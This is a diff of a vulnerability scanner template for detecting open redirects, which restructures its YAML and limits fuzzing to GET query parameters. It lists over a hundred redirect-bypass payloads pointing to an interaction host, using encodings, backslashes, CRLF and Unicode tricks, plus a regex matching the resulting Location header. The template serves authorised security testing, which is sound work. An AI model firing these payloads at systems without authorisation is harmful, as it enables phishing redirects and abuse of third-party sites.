@@ -1,15 +1,130 @@
 id: open-redirect-bypass
+
 info:
   name: Open Redirect Bypass
   author: ritikchaddha
   severity: medium
   metadata:
     max-request: 1
-  tags: dast,redirect,vuln
+  tags: redirect,dast,vuln
+
 http:
-  - fuzzing:
-      - fuzz:
-          - '{{redirect}}'
+  - pre-condition:
+      - type: dsl
+        dsl:
+          - 'method == "GET"'
+
+    payloads:
+      redirect:
+        - "{{Hostname}}.oast.me"
+        - "//oast.me"
+        - '////oast.me'
+        - "https:oast.me"
+        - '\/\/oast.me/'
+        - '/\/oast.me/'
+        - "oast。me"
+        - "//oast%E3%80%82me"
+        - "//oast%00.me"
+        - "@oast.me/"
+        - '/\{{Hostname}}%40oast.me'
+        - "{{Hostname}}@oast.me/"
+        - "{{RootURL}}/http://www.oast.me/"
+        - "{{RootURL}}?http://www.oast.me/"
+        - '%09/oast.me/'
+        - '%5C%5Coast.me/%252e%252e%252f'
+        - '%5Coast.me'
+        - '%5coast.me/%2f%2e%2e'
+        - '%5c{{RootURL}}oast.me/%2f%2e%2e'
+        - '../oast.me'
+        - '.oast.me'
+        - '/%5coast.me'
+        - '////\;@oast.me'
+        - '///oast.me'
+        - '///oast.me/%2f%2e%2e'
+        - '///oast.me@//'
+        - '///{{RootURL}}oast.me/%2f%2e%2e'
+        - '//;@oast.me'
+        - '//\/oast.me/'
+        - '//\@oast.me'
+        - '//\oast.me'
+        - '//\toast.me/'
+        - '//oast.me/%2F..'
+        - '//oast.me//'
+        - '//%69%6e%74%65%72%61%63%74%2e%73%68'
+        - '//oast.me@//'
+        - '//oast.me\toast.me/'
+        - '//https://oast.me@//'
+        - '/<>//oast.me'
+        - '/\/\/oast.me/'
+        - '/\/oast.me'
+        - '/\oast.me'
+        - '/oast.me'
+        - '/oast.me/%2F..'
+        - '/oast.me/'
+        - '/oast.me/..;/css'
+        - '/https:oast.me'
+        - '/{{RootURL}}oast.me/'
+        - '/〱oast.me'
+        - '/〵oast.me'
+        - '/ゝoast.me'
+        - '/ーoast.me'
+        - '/ｰoast.me'
+        - '<>//oast.me'
+        - '@oast.me'
+        - '@https://oast.me'
+        - '\/\/oast.me/'
+        - 'oast%E3%80%82me'
+        - 'oast.me'
+        - 'oast.me/'
+        - 'oast.me//'
+        - 'oast.me;@'
+        - 'https%3a%2f%2foast.me%2f'
+        - 'https:%0a%0doast.me'
+        - 'https://%0a%0doast.me'
+        - 'https://%09/oast.me'
+        - 'https://%2f%2f.oast.me/'
+        - 'https://%3F.oast.me/'
+        - 'https://%5c%5c.oast.me/'
+        - 'https://%5coast.me@'
+        - 'https://%23.oast.me/'
+        - 'https://.oast.me'
+        - 'https://////oast.me'
+        - 'https:///oast.me'
+        - 'https:///oast.me/%2e%2e'
+        - 'https:///oast.me/%2f%2e%2e'
+        - 'https:///oast.me@oast.me/%2e%2e'
+        - 'https:///oast.me@oast.me/%2f%2e%2e'
+        - 'https://:80#@oast.me/'
+        - 'https://:80?@oast.me/'
+        - 'https://:@\@oast.me'
+        - 'https://:@oast.me\@oast.me'
+        - 'https://;@oast.me'
+        - 'https://\toast.me/'
+        - 'https://oast.me/oast.me'
+        - 'https://oast.me/https://oast.me/'
+        - 'https://www.\.oast.me'
+        - 'https:/\/\oast.me'
+        - 'https:/\oast.me'
+        - 'https:/oast.me'
+        - 'https:oast.me'
+        - '{{RootURL}}oast.me'
+        - '〱oast.me'
+        - '〵oast.me'
+        - 'ゝoast.me'
+        - 'ーoast.me'
+        - 'ｰoast.me'
+        - 'redirect/oast.me'
+        - 'cgi-bin/redirect.cgi?oast.me'
+        - 'out?oast.me'
+        - 'login?to=http://oast.me'
+        - '#/oast.me'
+        - '%0a/oast.me/'
+        - '%0d/oast.me/'
+        - '%00/oast.me/'
+
+    fuzzing:
+      - part: query
+        mode: single
         keys:
           - AuthState
           - URL
@@ -146,142 +261,28 @@ http:
           - validate_url
           - DirectTo
           - relay
+
+        fuzz:
+          - "{{redirect}}"
+
+      - part: query
         mode: single
-        parts:
-          - query
-          - body
-      - fuzz:
-          - '{{redirect}}'
-        mode: single
-        parts:
-          - query
-          - body
         values:
-          - https?:// # Replace HTTP URLs with alternatives
+          - "https?://" # Replace HTTP URLs with alternatives
+        fuzz:
+          - "{{redirect}}"
+
+    stop-at-first-match: true
+    matchers-condition: and
     matchers:
-      - part: header
+      - type: regex
+        part: header
         regex:
-          - (?m)^(?:Location\s*?:\s*?)(?:https?:\/\/|\/\/|\/\\\\|\/\\)(?:[a-zA-Z0-9\-_\.@]*)oast\.me\/?(\/|[^.].*)?$ # https://regex101.me/r/idfD2e/1
-        type: regex
-      - status:
+          - '(?m)^(?:Location\s*?:\s*?)(?:https?:\/\/|\/\/|\/\\\\|\/\\)(?:[a-zA-Z0-9\-_\.@]*)oast\.me\/?(\/|[^.].*)?$' # https://regex101.me/r/idfD2e/1
+
+      - type: status
+        status:
           - 301
           - 302
           - 307
-        # digest: 4b0a00483046022100c1c842975b79e69dd34cb16e60db37aca091680acecc0f0d97f67178e7913977022100a1fb4830db8fb610c73b9e71c5b72e629baf6d5ea3ae289dc3c51cd715103700:922c64590222798bb761d5b6d8e72950
-
-        type: status
-    matchers-condition: and
-    payloads:
-      redirect:
-        - '{{Hostname}}.oast.me'
-        - //oast.me
-        - ////oast.me
-        - https:oast.me
-        - \/\/oast.me/
-        - /\/oast.me/
-        - oast。me
-        - //oast%E3%80%82me
-        - //oast%00.me
-        - '@oast.me/'
-        - /\{{Hostname}}%40oast.me
-        - '{{Hostname}}@oast.me/'
-        - '{{RootURL}}/http://www.oast.me/'
-        - '{{RootURL}}?http://www.oast.me/'
-        - '%09/oast.me/'
-        - '%5C%5Coast.me/%252e%252e%252f'
-        - '%5Coast.me'
-        - '%5coast.me/%2f%2e%2e'
-        - '%5c{{RootURL}}oast.me/%2f%2e%2e'
-        - ../oast.me
-        - .oast.me
-        - /%5coast.me
-        - ////\;@oast.me
-        - ///oast.me
-        - ///oast.me/%2f%2e%2e
-        - ///oast.me@//
-        - ///{{RootURL}}oast.me/%2f%2e%2e
-        - //;@oast.me
-        - //\/oast.me/
-        - //\@oast.me
-        - //\oast.me
-        - //\toast.me/
-        - //oast.me/%2F..
-        - //oast.me//
-        - //%69%6e%74%65%72%61%63%74%2e%73%68
-        - //oast.me@//
-        - //oast.me\toast.me/
-        - //https://oast.me@//
-        - /<>//oast.me
-        - /\/\/oast.me/
-        - /\/oast.me
-        - /\oast.me
-        - /oast.me
-        - /oast.me/%2F..
-        - /oast.me/
-        - /oast.me/..;/css
-        - /https:oast.me
-        - /{{RootURL}}oast.me/
-        - /〱oast.me
-        - /〵oast.me
-        - /ゝoast.me
-        - /ーoast.me
-        - /ｰoast.me
-        - <>//oast.me
-        - '@oast.me'
-        - '@https://oast.me'
-        - \/\/oast.me/
-        - oast%E3%80%82me
-        - oast.me
-        - oast.me/
-        - oast.me//
-        - oast.me;@
-        - https%3a%2f%2foast.me%2f
-        - https:%0a%0doast.me
-        - https://%0a%0doast.me
-        - https://%09/oast.me
-        - https://%2f%2f.oast.me/
-        - https://%3F.oast.me/
-        - https://%5c%5c.oast.me/
-        - https://%5coast.me@
-        - https://%23.oast.me/
-        - https://.oast.me
-        - https://////oast.me
-        - https:///oast.me
-        - https:///oast.me/%2e%2e
-        - https:///oast.me/%2f%2e%2e
-        - https:///oast.me@oast.me/%2e%2e
-        - https:///oast.me@oast.me/%2f%2e%2e
-        - https://:80#@oast.me/
-        - https://:80?@oast.me/
-        - https://:@\@oast.me
-        - https://:@oast.me\@oast.me
-        - https://;@oast.me
-        - https://\toast.me/
-        - https://oast.me/oast.me
-        - https://oast.me/https://oast.me/
-        - https://www.\.oast.me
-        - https:/\/\oast.me
-        - https:/\oast.me
-        - https:/oast.me
-        - https:oast.me
-        - '{{RootURL}}oast.me'
-        - 〱oast.me
-        - 〵oast.me
-        - ゝoast.me
-        - ーoast.me
-        - ｰoast.me
-        - redirect/oast.me
-        - cgi-bin/redirect.cgi?oast.me
-        - out?oast.me
-        - login?to=http://oast.me
-        - '#/oast.me'
-        - '%0a/oast.me/'
-        - '%0d/oast.me/'
-        - '%00/oast.me/'
-    pre-condition:
-      - dsl:
-          - method == "GET"
-          - method == "POST"
-          - method == "PUT"
-        type: dsl
-    stop-at-first-match: true
+# digest: 4a0a0047304502206a2882c605cac005cc99926e18ebd02dc43c4c31a756c745e7f4dd845ab2cca9022100d7cb3221c7842d7e9356fcd694217518a608885632f2cfd3e2abc52a2f26fad2:922c64590222798bb761d5b6d8e72950
